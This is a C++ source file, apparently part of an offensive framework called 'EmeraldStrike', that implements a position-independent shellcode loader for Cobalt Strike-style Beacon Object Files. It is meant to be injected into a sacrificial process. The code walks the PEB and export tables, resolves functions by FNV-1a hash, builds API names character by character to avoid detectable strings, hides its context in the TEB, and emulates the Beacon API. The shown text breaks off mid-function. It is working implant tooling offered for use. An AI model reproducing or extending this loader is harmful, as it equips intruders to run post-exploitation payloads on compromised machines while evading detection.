#pragma once
/*
 * bof_bootstrap.cc - PIC COFF/BOF loader shellcode for EmeraldStrike
 *
 * Compiled standalone:
 *   clang -target x86_64-w64-mingw32 -Os -nostdlib -fno-asynchronous-unwind-tables
 *         -fno-ident -fno-builtin -s -w -std=c++20 -fno-exceptions -fno-stack-protector
 *         -fno-function-sections -fno-zero-initialized-in-bss -fpack-struct=8 -mno-sse
 *         -masm=intel -fms-extensions -fno-jump-tables -e _bof_entry
 *         bof_bootstrap.cc -o bof_bootstrap.o
 *
 * The .text section is extracted as raw shellcode bytes and injected into a
 * sacrificial process for fork-and-run BOF execution.
 *
 * param layout:  [DWORD bof_len][DWORD args_len][UINT64 pipe_handle][BYTE bof_data[bof_len]][BYTE bof_args[args_len]]
 *
 * Output goes to inherited stdout (parent has piped it).
 */

#include <windows.h>

extern "C" {

/* ========================================================================= */
/* Inline helpers - no libc, no externals                                    */
/* ========================================================================= */

static inline void stub_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

static inline void stub_memset(void* dst, unsigned char val, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    while (n--) *d++ = val;
}

static inline int stub_strcmp(const char* a, const char* b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static inline unsigned long long stub_strlen(const char* s) {
    const char* p = s;
    while (*p) p++;
    return (unsigned long long)(p - s);
}

static inline int stub_strncmp(const char* a, const char* b, unsigned long long n) {
    while (n && *a && *b && *a == *b) { a++; b++; n--; }
    if (n == 0) return 0;
    return (unsigned char)*a - (unsigned char)*b;
}

/* ========================================================================= */
/* Function pointer typedefs                                                 */
/* ========================================================================= */

typedef HMODULE  (__stdcall *fn_LoadLibraryA)(const char*);
typedef FARPROC  (__stdcall *fn_GetProcAddress)(HMODULE, const char*);
typedef LPVOID   (__stdcall *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL     (__stdcall *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, DWORD*);
typedef BOOL     (__stdcall *fn_VirtualFree)(LPVOID, SIZE_T, DWORD);
typedef LPVOID   (__stdcall *fn_HeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL     (__stdcall *fn_HeapFree)(HANDLE, DWORD, LPVOID);
typedef HANDLE   (__stdcall *fn_GetProcessHeap)(void);
typedef int      (__stdcall *fn_MultiByteToWideChar)(UINT, DWORD, const char*, int, wchar_t*, int);
typedef void     (__stdcall *fn_ExitThread)(DWORD);
typedef BOOL     (__stdcall *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPVOID);
typedef HANDLE   (__stdcall *fn_GetStdHandle)(DWORD);
typedef BOOL     (__stdcall *fn_CloseHandle)(HANDLE);
typedef BOOL     (__stdcall *fn_FreeLibrary)(HMODULE);
typedef HANDLE   (__stdcall *fn_OpenProcess)(DWORD, BOOL, DWORD);

typedef int (__cdecl *fn_vsnprintf)(char*, unsigned long long, const char*, va_list);

/* ========================================================================= */
/* BOF Context - stored in TEB ArbitraryUserPointer (gs:[0x28])              */
/* ========================================================================= */

typedef struct _BOF_CTX {
    fn_LoadLibraryA       pLoadLibraryA;
    fn_GetProcAddress     pGetProcAddress;
    void*                 k32_base;
    void*                 ntdll_base;
    fn_VirtualAlloc       pVirtualAlloc;
    fn_VirtualProtect     pVirtualProtect;
    fn_VirtualFree        pVirtualFree;
    fn_HeapAlloc          pHeapAlloc;
    fn_HeapFree           pHeapFree;
    HANDLE                hHeap;
    fn_MultiByteToWideChar pMultiByteToWideChar;
    fn_WriteFile          pWriteFile;
    HANDLE                hStdout;
    fn_vsnprintf          p_vsnprintf;
    /* Output buffer */
    char*                 output;
    DWORD                 output_len;
    DWORD                 output_cap;
} BOF_CTX;

static inline void bof_set_ctx(BOF_CTX* p) {
    __asm__ volatile(
        ".byte 0x65, 0x48, 0x89, 0x0c, 0x25, 0x28, 0x00, 0x00, 0x00"
        :: "c"(p) : "memory"
    );
}

static inline BOF_CTX* bof_get_ctx() {
    void* r;
    __asm__ volatile(
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00"
        : "=a"(r)
    );
    return (BOF_CTX*)r;
}

/* ========================================================================= */
/* PEB walking: get ntdll and kernel32 bases (x64)                           */
/* ========================================================================= */

static inline void get_module_bases(void** out_ntdll, void** out_kernel32) {
    void* peb;
    __asm__ volatile(
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00"
        : "=a"(peb)
    );

    /* PEB -> Ldr (offset 0x18) */
    void* ldr = *(void**)((char*)peb + 0x18);

    /* Ldr -> InInitializationOrderModuleList.Flink (offset 0x30) */
    void* head = *(void**)((char*)ldr + 0x30);

    /* entry[0] = ntdll */
    void* entry0 = head;
    *out_ntdll = *(void**)((char*)entry0 + 0x10);

    /* entry[1] = kernel32 */
    void* entry1 = *(void**)entry0;
    *out_kernel32 = *(void**)((char*)entry1 + 0x10);
}

/* ========================================================================= */
/* PE export-table walk: find export by name string                          */
/* ========================================================================= */

static inline void* find_export(void* module_base, const char* func_name) {
    unsigned char* base = (unsigned char*)module_base;

    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    unsigned char* pe = base + e_lfanew;
    DWORD export_rva = *(DWORD*)(pe + 0x88);
    if (export_rva == 0) return 0;

    unsigned char* export_dir = base + export_rva;

    DWORD num_names      = *(DWORD*)(export_dir + 0x18);
    DWORD addr_table_rva = *(DWORD*)(export_dir + 0x1C);
    DWORD name_table_rva = *(DWORD*)(export_dir + 0x20);
    DWORD ord_table_rva  = *(DWORD*)(export_dir + 0x24);

    DWORD* addr_table = (DWORD*)(base + addr_table_rva);
    DWORD* name_table = (DWORD*)(base + name_table_rva);
    WORD*  ord_table  = (WORD*)(base + ord_table_rva);

    for (DWORD i = 0; i < num_names; i++) {
        const char* name = (const char*)(base + name_table[i]);
        if (stub_strcmp(name, func_name) == 0) {
            WORD ord = ord_table[i];
            return (void*)(base + addr_table[ord]);
        }
    }
    return 0;
}

/* ========================================================================= */
/* COFF structures                                                           */
/* ========================================================================= */

#pragma pack(push, 1)
typedef struct {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} COFF_HDR;

typedef struct {
    char  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} COFF_SEC;

typedef struct {
    DWORD VirtualAddress;
    DWORD SymbolTableIndex;
    WORD  Type;
} COFF_RELOC;

typedef struct {
    union {
        char ShortName[8];
        struct {
            DWORD Zeros;
            DWORD Offset;
        } LongName;
    } Name;
    DWORD Value;
    SHORT SectionNumber;
    WORD  Type;
    BYTE  StorageClass;
    BYTE  NumberOfAuxSymbols;
} COFF_SYM;
#pragma pack(pop)

#define COFF_MACHINE_AMD64       0x8664
#define IMAGE_SCN_MEM_EXECUTE    0x20000000
#define IMAGE_SYM_CLASS_EXTERNAL 2
#define IMAGE_SYM_CLASS_STATIC   3

#define IMAGE_REL_AMD64_ADDR64   1
#define IMAGE_REL_AMD64_ADDR32NB 3
#define IMAGE_REL_AMD64_REL32    4
#define IMAGE_REL_AMD64_REL32_1  5
#define IMAGE_REL_AMD64_REL32_2  6
#define IMAGE_REL_AMD64_REL32_3  7
#define IMAGE_REL_AMD64_REL32_4  8
#define IMAGE_REL_AMD64_REL32_5  9

#define MAX_SECTIONS     96
#define MAX_COFF_ALLOC   (64 * 1024 * 1024)
#define TRAMPOLINE_SIZE  12

/* ========================================================================= */
/* Beacon data structures                                                    */
/* ========================================================================= */

typedef struct {
    char* original;
    char* buffer;
    int   length;
    int   size;
} datap;

typedef datap formatp;

/* ========================================================================= */
/* FNV-1a hashing                                                            */
/* ========================================================================= */

static constexpr DWORD fnv1a(const char* s) {
    DWORD h = 0x811c9dc5;
    while (*s) { h ^= (BYTE)*s++; h *= 0x01000193; }
    return h;
}

static inline DWORD fnv1a_rt(const char* s) {
    DWORD h = 0x811c9dc5;
    while (*s) { h ^= (BYTE)*s++; h *= 0x01000193; }
    return h;
}

/* ========================================================================= */
/* Output buffer helpers                                                     */
/* ========================================================================= */

static inline void bof_output_append(const char* data, DWORD len) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx || !data || len == 0) return;

    /* Grow if needed */
    if (ctx->output_len + len > ctx->output_cap) {
        DWORD new_cap = ctx->output_cap;
        while (new_cap < ctx->output_len + len) {
            new_cap = new_cap < 4096 ? 8192 : new_cap * 2;
        }
        char* new_buf = (char*)ctx->pHeapAlloc(ctx->hHeap, 0, new_cap);
        if (!new_buf) return;
        if (ctx->output && ctx->output_len > 0) {
            stub_memcpy(new_buf, ctx->output, ctx->output_len);
        }
        if (ctx->output) {
            ctx->pHeapFree(ctx->hHeap, 0, ctx->output);
        }
        ctx->output = new_buf;
        ctx->output_cap = new_cap;
    }

    stub_memcpy(ctx->output + ctx->output_len, data, len);
    ctx->output_len += len;
}

/* ========================================================================= */
/* Beacon Data API                                                           */
/* ========================================================================= */

static void __cdecl _BeaconDataParse(datap* parser, char* buffer, int size) {
    if (!parser) return;
    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size;
    parser->size     = size;
}

static int __cdecl _BeaconDataInt(datap* parser) {
    if (!parser || parser->length < 4) return 0;
    int val = 0;
    unsigned char* p = (unsigned char*)parser->buffer;
    val = (int)p[0] | ((int)p[1] << 8) | ((int)p[2] << 16) | ((int)p[3] << 24);
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

static short __cdecl _BeaconDataShort(datap* parser) {
    if (!parser || parser->length < 2) return 0;
    unsigned char* p = (unsigned char*)parser->buffer;
    short val = (short)((int)p[0] | ((int)p[1] << 8));
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

static char* __cdecl _BeaconDataExtract(datap* parser, int* out_len) {
    if (!parser || parser->length < 4) {
        if (out_len) *out_len = 0;
        return 0;
    }
    unsigned char* p = (unsigned char*)parser->buffer;
    int blob_len = (int)p[0] | ((int)p[1] << 8) | ((int)p[2] << 16) | ((int)p[3] << 24);
    parser->buffer += 4;
    parser->length -= 4;

    if (blob_len < 0 || blob_len > parser->length) {
        if (out_len) *out_len = 0;
        return 0;
    }

    char* result = parser->buffer;
    parser->buffer += blob_len;
    parser->length -= blob_len;
    if (out_len) *out_len = blob_len;
    return result;
}

static int __cdecl _BeaconDataLength(datap* parser) {
    if (!parser) return 0;
    return parser->length;
}

static char* __cdecl _BeaconDataPtr(datap* parser, int size) {
    if (!parser || parser->length < size) return 0;
    char* result = parser->buffer;
    parser->buffer += size;
    parser->length -= size;
    return result;
}

/* ========================================================================= */
/* Beacon Format API                                                         */
/* ========================================================================= */

static void __cdecl _BeaconFormatAlloc(formatp* format, int maxsz) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx || !format) return;
    format->original = (char*)ctx->pHeapAlloc(ctx->hHeap, 0x8 /*HEAP_ZERO_MEMORY*/, (SIZE_T)maxsz);
    format->buffer   = format->original;
    format->length   = 0;
    format->size     = maxsz;
}

static void __cdecl _BeaconFormatReset(formatp* format) {
    if (!format) return;
    format->buffer = format->original;
    format->length = 0;
}

static void __cdecl _BeaconFormatFree(formatp* format) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx || !format || !format->original) return;
    ctx->pHeapFree(ctx->hHeap, 0, format->original);
    format->original = 0;
    format->buffer   = 0;
    format->length   = 0;
    format->size     = 0;
}

static void __cdecl _BeaconFormatAppend(formatp* format, const char* data, int len) {
    if (!format || !data || len <= 0) return;
    if (format->length + len > format->size) return;
    stub_memcpy(format->original + format->length, data, (unsigned long long)len);
    format->length += len;
}

static void __cdecl _BeaconFormatPrintf(formatp* format, const char* fmt, ...) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx || !ctx->p_vsnprintf || !format) return;

    int remaining = format->size - format->length;
    if (remaining <= 0) return;

    va_list args;
    va_start(args, fmt);
    int written = ctx->p_vsnprintf(format->original + format->length, (unsigned long long)remaining, fmt, args);
    va_end(args);

    if (written > 0) {
        if (written > remaining) written = remaining;
        format->length += written;
    }
}

static char* __cdecl _BeaconFormatToString(formatp* format, int* out_len) {
    if (!format) {
        if (out_len) *out_len = 0;
        return 0;
    }
    if (out_len) *out_len = format->length;
    return format->original;
}

static void __cdecl _BeaconFormatInt(formatp* format, int value) {
    /* Append 4-byte big-endian integer (Cobalt Strike convention) */
    if (!format || format->length + 4 > format->size) return;
    unsigned char buf[4];
    buf[0] = (unsigned char)((value >> 24) & 0xFF);
    buf[1] = (unsigned char)((value >> 16) & 0xFF);
    buf[2] = (unsigned char)((value >> 8) & 0xFF);
    buf[3] = (unsigned char)(value & 0xFF);
    stub_memcpy(format->original + format->length, buf, 4);
    format->length += 4;
}

/* ========================================================================= */
/* Beacon Output API                                                         */
/* ========================================================================= */

static void __cdecl _BeaconPrintf(int type, const char* fmt, ...) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx || !ctx->p_vsnprintf || !fmt) return;

    char stack_buf[2048];
    va_list args;
    va_start(args, fmt);
    int written = ctx->p_vsnprintf(stack_buf, sizeof(stack_buf) - 1, fmt, args);
    va_end(args);

    if (written > 0) {
        if (written >= (int)sizeof(stack_buf)) written = (int)sizeof(stack_buf) - 1;
        stack_buf[written] = '\0';
        bof_output_append(stack_buf, (DWORD)written);
    }
}

static void __cdecl _BeaconOutput(int type, const char* data, int len) {
    if (data && len > 0) {
        bof_output_append(data, (DWORD)len);
    }
}

/* ========================================================================= */
/* Beacon Stub APIs (no-op / minimal)                                        */
/* ========================================================================= */

static BOOL  __cdecl _BeaconUseToken(HANDLE token)             { (void)token; return FALSE; }
static void  __cdecl _BeaconRevertToken(void)                   { }
static BOOL  __cdecl _BeaconIsAdmin(void)                       { return FALSE; }
static void  __cdecl _BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len) {
    (void)hProcess; (void)pid; (void)payload; (void)p_len; (void)p_offset; (void)arg; (void)a_len;
}
static void  __cdecl _BeaconInjectTemporaryProcess(void* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len) {
    (void)pInfo; (void)payload; (void)p_len; (void)p_offset; (void)arg; (void)a_len;
}
static BOOL  __cdecl _BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, void* pInfo) {
    (void)x86; (void)ignoreToken; (void)pInfo; return FALSE;
}
static void  __cdecl _BeaconCleanupProcess(void* pInfo)         { (void)pInfo; }

static void  __cdecl _BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
    (void)x86;
    /* Fill with "rundll32.exe" */
    if (buffer && length > 0) {
        stub_memset(buffer, 0, (unsigned long long)length);
        const char r[] = { 'r','u','n','d','l','l','3','2','.','e','x','e','\0' };
        int copy_len = 13;
        if (copy_len > length) copy_len = length;
        stub_memcpy(buffer, r, (unsigned long long)copy_len);
    }
}

static BOOL  __cdecl _BeaconDownload(void* a, void* b, void* c) { (void)a; (void)b; (void)c; return TRUE; }

static BOOL  __cdecl _BeaconInformation(void* info) {
    if (info) stub_memset(info, 0, 128); /* safe zero-fill */
    return TRUE;
}

static void  __cdecl _BeaconAddValue(const char* key, void* value)     { (void)key; (void)value; }
static void* __cdecl _BeaconGetValue(const char* key)                  { (void)key; return 0; }
static BOOL  __cdecl _BeaconRemoveValue(const char* key)               { (void)key; return FALSE; }

static void* __cdecl _BeaconDataStoreGetItem(int index)                { (void)index; return 0; }
static void  __cdecl _BeaconDataStoreProtectItem(int index)            { (void)index; }
static void  __cdecl _BeaconDataStoreUnprotectItem(int index)          { (void)index; }
static int   __cdecl _BeaconDataStoreMaxEntries(void)                  { return 0; }

static void* __cdecl _BeaconGetCustomUserData(void)                    { return 0; }

static BOOL  __cdecl _BeaconGetSyscallInformation(void* info, int is_wow) {
    (void)is_wow;
    if (info) stub_memset(info, 0, 64);
    return TRUE;
}

static void  __cdecl _BeaconDisableBeaconGate(void)                    { }
static void  __cdecl _BeaconEnableBeaconGate(void)                     { }
static void  __cdecl _BeaconDisableBeaconGateMasking(void)             { }
static void  __cdecl _BeaconEnableBeaconGateMasking(void)              { }

/* ========================================================================= */
/* Beacon Pass-through APIs                                                  */
/* ========================================================================= */

static LPVOID __cdecl _BeaconVirtualAlloc(LPVOID addr, SIZE_T sz, DWORD type, DWORD prot) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return 0;
    return ctx->pVirtualAlloc(addr, sz, type, prot);
}

static BOOL __cdecl _BeaconVirtualProtect(LPVOID addr, SIZE_T sz, DWORD prot, DWORD* old) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return FALSE;
    return ctx->pVirtualProtect(addr, sz, prot, old);
}

static BOOL __cdecl _BeaconVirtualFree(LPVOID addr, SIZE_T sz, DWORD type) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return FALSE;
    return ctx->pVirtualFree(addr, sz, type);
}

static HANDLE __cdecl _BeaconOpenProcess(DWORD access, BOOL inherit, DWORD pid) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return 0;
    /* "OpenProcess" */
    char s_op[12];
    s_op[0]='O'; s_op[1]='p'; s_op[2]='e'; s_op[3]='n';
    s_op[4]='P'; s_op[5]='r'; s_op[6]='o'; s_op[7]='c';
    s_op[8]='e'; s_op[9]='s'; s_op[10]='s'; s_op[11]='\0';
    fn_OpenProcess pOP = (fn_OpenProcess)ctx->pGetProcAddress((HMODULE)ctx->k32_base, s_op);
    if (!pOP) return 0;
    return pOP(access, inherit, pid);
}

static BOOL __cdecl _BeaconCloseHandle(HANDLE h) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return FALSE;
    /* "CloseHandle" */
    char s_ch[12];
    s_ch[0]='C'; s_ch[1]='l'; s_ch[2]='o'; s_ch[3]='s';
    s_ch[4]='e'; s_ch[5]='H'; s_ch[6]='a'; s_ch[7]='n';
    s_ch[8]='d'; s_ch[9]='l'; s_ch[10]='e'; s_ch[11]='\0';
    fn_CloseHandle pCH = (fn_CloseHandle)ctx->pGetProcAddress((HMODULE)ctx->k32_base, s_ch);
    if (!pCH) return FALSE;
    return pCH(h);
}

static int __cdecl _toWideChar(const char* src, wchar_t* dst, int max) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return 0;
    return ctx->pMultiByteToWideChar(0 /*CP_ACP*/, 0, src, -1, dst, max);
}

/* ========================================================================= */
/* Win32 pass-through stubs for BOF DFR fallback                             */
/* ========================================================================= */

static FARPROC __cdecl _bof_GetProcAddress(HMODULE h, const char* name) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return 0;
    return ctx->pGetProcAddress(h, name);
}

static HMODULE __cdecl _bof_LoadLibraryA(const char* name) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return 0;
    return ctx->pLoadLibraryA(name);
}

static HMODULE __cdecl _bof_GetModuleHandleA(const char* name) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return 0;
    /* "GetModuleHandleA" */
    char s_gmha[17];
    s_gmha[0]='G'; s_gmha[1]='e'; s_gmha[2]='t'; s_gmha[3]='M';
    s_gmha[4]='o'; s_gmha[5]='d'; s_gmha[6]='u'; s_gmha[7]='l';
    s_gmha[8]='e'; s_gmha[9]='H'; s_gmha[10]='a'; s_gmha[11]='n';
    s_gmha[12]='d'; s_gmha[13]='l'; s_gmha[14]='e'; s_gmha[15]='A';
    s_gmha[16]='\0';
    typedef HMODULE (__stdcall *fn_GMHA)(const char*);
    fn_GMHA p = (fn_GMHA)ctx->pGetProcAddress((HMODULE)ctx->k32_base, s_gmha);
    if (!p) return 0;
    return p(name);
}

static BOOL __cdecl _bof_FreeLibrary(HMODULE h) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return FALSE;
    /* "FreeLibrary" */
    char s_fl[12];
    s_fl[0]='F'; s_fl[1]='r'; s_fl[2]='e'; s_fl[3]='e';
    s_fl[4]='L'; s_fl[5]='i'; s_fl[6]='b'; s_fl[7]='r';
    s_fl[8]='a'; s_fl[9]='r'; s_fl[10]='y'; s_fl[11]='\0';
    fn_FreeLibrary p = (fn_FreeLibrary)ctx->pGetProcAddress((HMODULE)ctx->k32_base, s_fl);
    if (!p) return FALSE;
    return p(h);
}

/* ========================================================================= */
/* Symbol resolution: __imp_ prefix stripping + DFR + Beacon API dispatch    */
/* ========================================================================= */

/* Forward declaration */
static void* resolve_bof_symbol(const char* name, void* seh_handler);

/* DFR: parse "MODULE$Function" or "MODULE$Function@N" */
static void* resolve_dfr(const char* name) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return 0;

    /* Find the '$' separator */
    const char* dollar = name;
    while (*dollar && *dollar != '$') dollar++;
    if (*dollar != '$') return 0;

    int mod_len = (int)(dollar - name);
    if (mod_len <= 0 || mod_len > 250) return 0;

    /* Build "MODULE.dll" on stack */
    char mod_name[260];
    stub_memcpy(mod_name, name, (unsigned long long)mod_len);
    mod_name[mod_len]   = '.';
    mod_name[mod_len+1] = 'd';
    mod_name[mod_len+2] = 'l';
    mod_name[mod_len+3] = 'l';
    mod_name[mod_len+4] = '\0';

    HMODULE hMod = ctx->pLoadLibraryA(mod_name);
    if (!hMod) return 0;

    /* Function name: after '$', strip @N suffix */
    const char* func = dollar + 1;
    char func_name[260];
    int fi = 0;
    while (*func && *func != '@' && fi < 259) {
        func_name[fi++] = *func++;
    }
    func_name[fi] = '\0';

    return (void*)ctx->pGetProcAddress(hMod, func_name);
}

static void* resolve_bof_symbol(const char* name, void* seh_handler) {
    /* Strip __imp_ prefix */
    if (name[0] == '_' && name[1] == '_' && name[2] == 'i' && name[3] == 'm' &&
        name[4] == 'p' && name[5] == '_') {
        return resolve_bof_symbol(name + 6, seh_handler);
    }

    DWORD h = fnv1a_rt(name);

    /* --- Beacon Data API --- */
    if (h == fnv1a("BeaconDataParse"))       return (void*)_BeaconDataParse;
    if (h == fnv1a("BeaconDataInt"))         return (void*)_BeaconDataInt;
    if (h == fnv1a("BeaconDataShort"))       return (void*)_BeaconDataShort;
    if (h == fnv1a("BeaconDataExtract"))     return (void*)_BeaconDataExtract;
    if (h == fnv1a("BeaconDataLength"))      return (void*)_BeaconDataLength;
    if (h == fnv1a("BeaconDataPtr"))         return (void*)_BeaconDataPtr;

    /* --- Beacon Format API --- */
    if (h == fnv1a("BeaconFormatAlloc"))     return (void*)_BeaconFormatAlloc;
    if (h == fnv1a("BeaconFormatReset"))     return (void*)_BeaconFormatReset;
    if (h == fnv1a("BeaconFormatFree"))      return (void*)_BeaconFormatFree;
    if (h == fnv1a("BeaconFormatAppend"))    return (void*)_BeaconFormatAppend;
    if (h == fnv1a("BeaconFormatPrintf"))    return (void*)_BeaconFormatPrintf;
    if (h == fnv1a("BeaconFormatToString"))  return (void*)_BeaconFormatToString;
    if (h == fnv1a("BeaconFormatInt"))       return (void*)_BeaconFormatInt;

    /* --- Output --- */
    if (h == fnv1a("BeaconPrintf"))          return (void*)_BeaconPrintf;
    if (h == fnv1a("BeaconOutput"))          return (void*)_BeaconOutput;

    /* --- Token --- */
    if (h == fnv1a("BeaconUseToken"))        return (void*)_BeaconUseToken;
    if (h == fnv1a("BeaconRevertToken"))     return (void*)_BeaconRevertToken;

    /* --- Spawn/Inject --- */
    if (h == fnv1a("BeaconInjectProcess"))            return (void*)_BeaconInjectProcess;
    if (h == fnv1a("BeaconInjectTemporaryProcess"))    return (void*)_BeaconInjectTemporaryProcess;
    if (h == fnv1a("BeaconSpawnTemporaryProcess"))     return (void*)_BeaconSpawnTemporaryProcess;
    if (h == fnv1a("BeaconCleanupProcess"))            return (void*)_BeaconCleanupProcess;
    if (h == fnv1a("BeaconGetSpawnTo"))                return (void*)_BeaconGetSpawnTo;

    /* --- Utility --- */
    if (h == fnv1a("BeaconIsAdmin"))         return (void*)_BeaconIsAdmin;
    if (h == fnv1a("toWideChar"))            return (void*)_toWideChar;
    if (h == fnv1a("BeaconDownload"))        return (void*)_BeaconDownload;
    if (h == fnv1a("BeaconInformation"))     return (void*)_BeaconInformation;

    /* --- K/V --- */
    if (h == fnv1a("BeaconAddValue"))        return (void*)_BeaconAddValue;
    if (h == fnv1a("BeaconGetValue"))        return (void*)_BeaconGetValue;
    if (h == fnv1a("BeaconRemoveValue"))     return (void*)_BeaconRemoveValue;

    /* --- Data Store --- */
    if (h == fnv1a("BeaconDataStoreGetItem"))       return (void*)_BeaconDataStoreGetItem;
    if (h == fnv1a("BeaconDataStoreProtectItem"))    return (void*)_BeaconDataStoreProtectItem;
    if (h == fnv1a("BeaconDataStoreUnprotectItem"))  return (void*)_BeaconDataStoreUnprotectItem;
    if (h == fnv1a("BeaconDataStoreMaxEntries"))     return (void*)_BeaconDataStoreMaxEntries;

    /* --- Custom --- */
    if (h == fnv1a("BeaconGetCustomUserData"))       return (void*)_BeaconGetCustomUserData;

    /* --- Syscall --- */
    if (h == fnv1a("BeaconGetSyscallInformation"))   return (void*)_BeaconGetSyscallInformation;

    /* --- Virtual --- */
    if (h == fnv1a("BeaconVirtualAlloc"))    return (void*)_BeaconVirtualAlloc;
    if (h == fnv1a("BeaconVirtualProtect"))  return (void*)_BeaconVirtualProtect;
    if (h == fnv1a("BeaconVirtualFree"))     return (void*)_BeaconVirtualFree;
    if (h == fnv1a("BeaconOpenProcess"))     return (void*)_BeaconOpenProcess;
    if (h == fnv1a("BeaconCloseHandle"))     return (void*)_BeaconCloseHandle;

    /* --- Gate --- */
    if (h == fnv1a("BeaconDisableBeaconGate"))         return (void*)_BeaconDisableBeaconGate;
    if (h == fnv1a("BeaconEnableBeaconGate"))           return (void*)_BeaconEnableBeaconGate;
    if (h == fnv1a("BeaconDisableBeaconGateMasking"))   return (void*)_BeaconDisableBeaconGateMasking;
    if (h == fnv1a("BeaconEnableBeaconGateMasking"))    return (void*)_BeaconEnableBeaconGateMasking;

    /* --- Direct Win32 --- */
    if (h == fnv1a("GetProcAddress"))        return (void*)_bof_GetProcAddress;
    if (h == fnv1a("LoadLibraryA"))          return (void*)_bof_LoadLibraryA;
    if (h == fnv1a("GetModuleHandleA"))      return (void*)_bof_GetModuleHandleA;
    if (h == fnv1a("FreeLibrary"))           return (void*)_bof_FreeLibrary;

    /* --- SEH --- */
    if (h == fnv1a("__C_specific_handler"))  return seh_handler;

    /* --- DFR: MODULE$Function --- */
    {
        const char* p = name;
        while (*p) {
            if (*p == '$') return resolve_dfr(name);
            p++;
        }
    }

    /* Unresolved */
    return 0;
}

/* ========================================================================= */
/* COFF Loader                                                               */
/* ========================================================================= */

static inline DWORD align16(DWORD v) {
    return (v + 15) & ~15u;
}

/* Get symbol name from symbol table, handling long names via string table */
static inline const char* get_sym_name(COFF_SYM* sym, char* string_table, char* short_buf) {
    if (sym->Name.LongName.Zeros == 0) {
        /* Long name: offset into string table */
        return string_table + sym->Name.LongName.Offset;
    } else {
        /* Short name: up to 8 chars, may not be null-terminated */
        stub_memcpy(short_buf, sym->Name.ShortName, 8);
        short_buf[8] = '\0';
        return short_buf;
    }
}

typedef void (__cdecl *fn_bof_go)(char*, int);

static DWORD load_and_run_coff(
    BYTE*          coff_data,
    DWORD          coff_len,
    char*          bof_args,
    DWORD          args_len,
    void*          seh_handler
) {
    BOF_CTX* ctx = bof_get_ctx();
    if (!ctx) return 1;

    /* ------------------------------------------------------------------- */
    /* Validate COFF header                                                */
    /* ------------------------------------------------------------------- */
    if (coff_len < sizeof(COFF_HDR)) return 2;

    COFF_HDR* hdr = (COFF_HDR*)coff_data;
    if (hdr->Machine != COFF_MACHINE_AMD64)      return 3;
    if (hdr->SizeOfOptionalHeader != 0)           return 4;
    if (hdr->NumberOfSections == 0 || hdr->NumberOfSections > MAX_SECTIONS) return 5;

    WORD  num_secs = hdr->NumberOfSections;
    DWORD num_syms = hdr->NumberOfSymbols;

    COFF_SEC* sec_table = (COFF_SEC*)(coff_data + sizeof(COFF_HDR));

    /* Symbol table + string table */
    DWORD sym_offset = hdr->PointerToSymbolTable;
    if (sym_offset == 0 || sym_offset + num_syms * sizeof(COFF_SYM) > coff_len) return 6;

    COFF_SYM* sym_table = (COFF_SYM*)(coff_data + sym_offset);
    char* string_table = (char*)(sym_table + num_syms);

    /* ------------------------------------------------------------------- */
    /* Calculate total allocation size                                     */
    /* ------------------------------------------------------------------- */
    DWORD total_sec_size = 0;
    DWORD sec_sizes[MAX_SECTIONS];
    DWORD sec_offsets[MAX_SECTIONS];
    stub_memset(sec_sizes, 0, sizeof(sec_sizes));
    stub_memset(sec_offsets, 0, sizeof(sec_offsets));

    for (WORD i = 0; i < num_secs; i++) {
        DWORD sz = sec_table[i].SizeOfRawData;
        if (sz == 0) sz = sec_table[i].VirtualSize;
        sz = align16(sz);

        /* Page-align the boundary between executable and non-executable sections.
         * Without this, VirtualProtect on .text (RW->RX) affects the entire 4KB page,
         * making adjacent .data/.bss read-only too. The BOF then crashes writing globals. */
        if (i > 0 && (sec_table[i-1].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            !(sec_table[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            total_sec_size = (total_sec_size + 0xFFF) & ~(DWORD)0xFFF;
        }

        sec_offsets[i] = total_sec_size;
        sec_sizes[i] = sz;
        total_sec_size += sz;
    }

